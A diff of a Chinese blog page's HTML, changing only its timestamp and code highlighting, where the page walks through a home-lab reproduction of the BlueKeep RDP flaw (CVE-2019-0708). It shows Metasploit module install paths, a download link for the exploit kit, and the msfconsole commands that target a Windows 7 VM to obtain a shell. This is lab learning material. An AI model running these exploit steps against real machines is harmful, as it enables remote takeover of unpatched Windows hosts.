@@ -25,7 +25,7 @@
 <meta property="og:image" content="http://klforever.cn/images/3/5.png">
 <meta property="og:image" content="http://klforever.cn/images/3/6.png">
 <meta property="og:image" content="http://klforever.cn/images/3/7.png">
-<meta property="og:updated_time" content="2019-10-09T00:42:57.110Z">
+<meta property="og:updated_time" content="2021-04-25T09:04:54.699Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="RDP漏洞CVE-2019-0708复现">
 <meta name="twitter:description" content="0x01 漏洞描述 在2019年5月，微软发布了针对远程代码执行漏洞CVE-2019-0708的补丁更新，该漏洞也称为“BlueKeep”，漏洞存在于远程桌面服务（RDS）的代码中。此漏洞是预身份验证，无需用户交互，因此具有潜在武器化蠕虫性性漏洞利用的危险。如果成功利用此漏洞，则可以使用“系统”权限执行任意代码。Microsoft安全响应中心的建议表明这个漏洞也可能会成为一种蠕虫攻击行为，类似于W">
@@ -52,14 +52,15 @@
 
   
     
- 	  <script src="/lib/clickLove.js"></script><!-- hexo-inject:begin --><!-- hexo-inject:end -->
+ 	  <script src="/lib/clickLove.js"></script>
   
   
 
 
   
 
-</head>
+<link rel="stylesheet" href="/css/prism-hopscotch.css" type="text/css">
+<link rel="stylesheet" href="/css/prism-line-numbers.css" type="text/css"><!-- hexo-inject:begin --><!-- hexo-inject:end --></head>
 
 <body>
   <!-- hexo-inject:begin --><!-- hexo-inject:end --><div id="container" q-class="show:isCtnShow">
@@ -253,36 +254,41 @@
 <p>攻击机ip（kali linux）：192.168.1.105<br>靶   机ip（win7  SP1) ：192.168.1.106<br>win7 SP1 镜像地址：<br><code>ed2k://|file|cn_windows_7_professional_with_sp1_x64_dvd_u_677031.iso|3420557312|430BEDC0F22FA18001F717F7AF08C9D5|/</code></p>
 <p>CVE-2019-0708利用套件：<br><code>https://pan.baidu.com/s/1HqmKbp4ZjMsUm0gRlTEVFQ 提取码: vkqw</code></p>
 <h1 id="0x02-复现过程"><a href="#0x02-复现过程" class="headerlink" title="0x02 复现过程"></a>0x02 复现过程</h1><p>复现的时候也是有很多问题，我使用的metasploit的版本是5.0.22，所以无法适配最新的cve-2019-0708漏洞的套件，所以要在kali中更新一波metasploit。<br>执行两行代码可直接更新：</p>
-<pre><code>apt-get update
-apt-get install metasploit-framework</code></pre><p><img src="/images/3/1.png" alt></p>
+<pre class="line-numbers language-java"><code class="language-java">apt<span class="token operator">-</span>get update
+apt<span class="token operator">-</span>get install metasploit<span class="token operator">-</span>framework<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
+<p><img src="/images/3/1.png" alt></p>
 <p>更新过后即可将套件放至各个模块文件下，但是在这个过程中我所看到的博客里面看到的都是一个路径，而这个路径是手动安装metasploit时候的安装路径，所以在放至路径的时候出错将会出现如下错误。</p>
-<pre><code>[-] 192.168.1.106:3389 - Exploit failed: NameError undefined local variable or method `rdp_connect&#39; for #&lt;Msf::Modules::Exploit__Windows__Rdp__Cve_2019_0708_bluekeep_rce::MetasploitModule:0x00007f9c251837b0&gt;</code></pre><p>复现过程中这个也是最浪费时间的一个地方了，最后在kali linux 论坛中找到了kali中metasploit的模块路径。在下载套件之后将文件移动到各个文件夹下即可</p>
-<pre><code>rdp.rb -&gt; /usr/share/metasploit-framework/lib/msf/core/exploit 
+<pre class="line-numbers language-java"><code class="language-java"><span class="token punctuation">[</span><span class="token operator">-</span><span class="token punctuation">]</span> <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.106</span><span class="token operator">:</span><span class="token number">3389</span> <span class="token operator">-</span> Exploit failed<span class="token operator">:</span> NameError undefined local variable or method `rdp_connect' <span class="token keyword">for</span> #<span class="token operator">&lt;</span>Msf<span class="token operator">:</span><span class="token operator">:</span>Modules<span class="token operator">:</span><span class="token operator">:</span>Exploit__Windows__Rdp__Cve_2019_0708_bluekeep_rce<span class="token operator">:</span><span class="token operator">:</span>MetasploitModule<span class="token operator">:</span><span class="token number">0x00007f9c251837b0</span><span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
+<p>复现过程中这个也是最浪费时间的一个地方了，最后在kali linux 论坛中找到了kali中metasploit的模块路径。在下载套件之后将文件移动到各个文件夹下即可</p>
+<pre class="line-numbers language-java"><code class="language-java">rdp<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>lib<span class="token operator">/</span>msf<span class="token operator">/</span>core<span class="token operator">/</span>exploit 
 
-rdp_scanner.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp 
+rdp_scanner<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp 
 
-cve_2019_0708_bluekeep.rb -&gt; /usr/share/metasploit-framework/modules/auxiliary/scanner/rdp 
+cve_2019_0708_bluekeep<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp 
 
-cve_2019_0708_bluekeep_rce.rb -&gt; /usr/share/metasploit-framework/modules/exploits/windows/rdp 
+cve_2019_0708_bluekeep_rce<span class="token punctuation">.</span>rb <span class="token operator">-</span><span class="token operator">></span> <span class="token operator">/</span>usr<span class="token operator">/</span>share<span class="token operator">/</span>metasploit<span class="token operator">-</span>framework<span class="token operator">/</span>modules<span class="token operator">/</span>exploits<span class="token operator">/</span>windows<span class="token operator">/</span>rdp 
 
 需要注意如果没有目录就去创建个。
-</code></pre><p>接下来就可以进入metasploit控制台操作了，进入之后先要重新加载所有模块<br><code>reload_all</code></p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>接下来就可以进入metasploit控制台操作了，进入之后先要重新加载所有模块<br><code>reload_all</code></p>
 <p>之后直接搜索0708漏洞。</p>
-<pre><code>msf5 exploit(windows/rdp/cve_2019_0708_bluekeep_rce) &gt; search 0708
-=======
+<pre class="line-numbers language-java"><code class="language-java">msf5 <span class="token function">exploit</span><span class="token punctuation">(</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce<span class="token punctuation">)</span> <span class="token operator">></span> search <span class="token number">0708</span>
+<span class="token operator">==</span><span class="token operator">==</span><span class="token operator">==</span><span class="token operator">=</span>
 
    #  Name                                             Disclosure Date  Rank    Check  Description
-   -  ----                                             ---------------  ----    -----  -----------
-   0  auxiliary/scanner/rdp/cve_2019_0708_bluekeep     2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
-   1  exploit/windows/browser/clear_quest_cqole        2012-05-19       normal  No     IBM Rational ClearQuest CQOle Remote Code Execution
-   2  exploit/windows/browser/tumbleweed_filetransfer  2008-04-07       great   No     Tumbleweed FileTransfer vcst_eu.dll ActiveX Control Buffer Overflow
-   3  exploit/windows/rdp/cve_2019_0708_bluekeep_rce   2019-05-14       manual  Yes    CVE-2019-0708 BlueKeep RDP Remote Windows Kernel Use After Free
-   4  auxiliary/windows/rdp/cve_2019_0708_bluekeep     2019-05-14       normal  Yes    CVE-2019-0708 BlueKeep Microsoft Remote Desktop RCE Check
-</code></pre><pre><code>use exploit/windows/rdp/cve_2019_0708_bluekeep_rce
-set rhosts 192.168.1.106
-set target 3
+   <span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span>                                             <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span>    <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>  <span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">--</span><span class="token operator">-</span>
+   <span class="token number">0</span>  auxiliary<span class="token operator">/</span>scanner<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep     <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       normal  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep Microsoft Remote Desktop RCE Check
+   <span class="token number">1</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>clear_quest_cqole        <span class="token number">2012</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">19</span>       normal  No     IBM Rational ClearQuest CQOle Remote Code Execution
+   <span class="token number">2</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>browser<span class="token operator">/</span>tumbleweed_filetransfer  <span class="token number">2008</span><span class="token operator">-</span><span class="token number">04</span><span class="token operator">-</span><span class="token number">07</span>       great   No     Tumbleweed FileTransfer vcst_eu<span class="token punctuation">.</span>dll ActiveX Control Buffer Overflow
+   <span class="token number">3</span>  exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce   <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       manual  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep RDP Remote Windows Kernel Use After Free
+   <span class="token number">4</span>  auxiliary<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep     <span class="token number">2019</span><span class="token operator">-</span><span class="token number">05</span><span class="token operator">-</span><span class="token number">14</span>       normal  Yes    CVE<span class="token operator">-</span><span class="token number">2019</span><span class="token operator">-</span><span class="token number">0708</span> BlueKeep Microsoft Remote Desktop RCE Check
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<pre class="line-numbers language-java"><code class="language-java">use exploit<span class="token operator">/</span>windows<span class="token operator">/</span>rdp<span class="token operator">/</span>cve_2019_0708_bluekeep_rce
+set rhosts <span class="token number">192.168</span><span class="token punctuation">.</span><span class="token number">1.106</span>
+set target <span class="token number">3</span>
 exploit
-</code></pre><p>target 参数在其他各个博客当中都讲到如果是VMware需要设置为3，所以我依照参考设置为3。</p>
+<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre>
+<p>target 参数在其他各个博客当中都讲到如果是VMware需要设置为3，所以我依照参考设置为3。</p>
 <p><img src="/images/3/2.png" alt></p>
 <p>现在就是开开心心的等待shell的出现啦</p>
 <p><img src="/images/3/3.png" alt></p>
@@ -299,11 +305,12 @@ exploit</code></pre><p>随后进入的就是漫长的等待了，正当要绝望
 <p><img src="/images/3/7.png" alt></p>
 <p>至此复现结束。</p>
 <h1 id="0x03-漏洞危害"><a href="#0x03-漏洞危害" class="headerlink" title="0x03   漏洞危害"></a>0x03   漏洞危害</h1><p>目前公布的影响范围：</p>
-<pre><code>Windows 7
-Windows Server 2008 R2
-Windows Server 2008
-Windows 2003
-Windows XP</code></pre><p>该漏洞的影响范围巨大，甚至能和MS17-010相媲美，但是在实际利用过程中也可能造成实际生产环境的破坏，所以在检测是还是用scanner中的检测模块较好.</p>
+<pre class="line-numbers language-java"><code class="language-java">Windows <span class="token number">7</span>
+Windows Server <span class="token number">2008</span> R2
+Windows Server <span class="token number">2008</span>
+Windows <span class="token number">2003</span>
+Windows XP<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre>
+<p>该漏洞的影响范围巨大，甚至能和MS17-010相媲美，但是在实际利用过程中也可能造成实际生产环境的破坏，所以在检测是还是用scanner中的检测模块较好.</p>
 
     
 
